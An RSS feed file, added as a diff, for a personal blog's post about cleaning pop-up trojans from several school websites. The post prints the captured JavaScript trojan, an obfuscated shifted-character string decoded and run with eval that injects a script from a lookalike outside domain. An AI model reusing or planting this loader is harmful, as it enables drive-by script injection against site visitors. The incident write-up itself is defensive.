@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>js on LINTENG&#39;S BLOG</title>
+    <link>/tags/js/</link>
+    <description>Recent content in js on LINTENG&#39;S BLOG</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 31 Dec 2015 00:00:00 +0000</lastBuildDate><atom:link href="/tags/js/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>js木马</title>
+      <link>/post/js%E6%9C%A8%E9%A9%AC/</link>
+      <pubDate>Thu, 31 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>/post/js%E6%9C%A8%E9%A9%AC/</guid>
+      <description>最近发现学校的多个站点，中了弹窗木马，费了好大劲，清完了，同时缴获php大马一枚，还不错。。。
+木马代码
+var str=&amp;#34;cnbtldms-vqhsd&amp;#39;!;rbqhosrqb&amp;lt;[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:&amp;#34;;var length=str.length;var ba64=&amp;#34;&amp;#34;;for(i=0;i&amp;lt;length;i++){var s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)}eval(ba64); 木马程序就不上传了，哈哈</description>
+    </item>
+    
+  </channel>
+</rss>
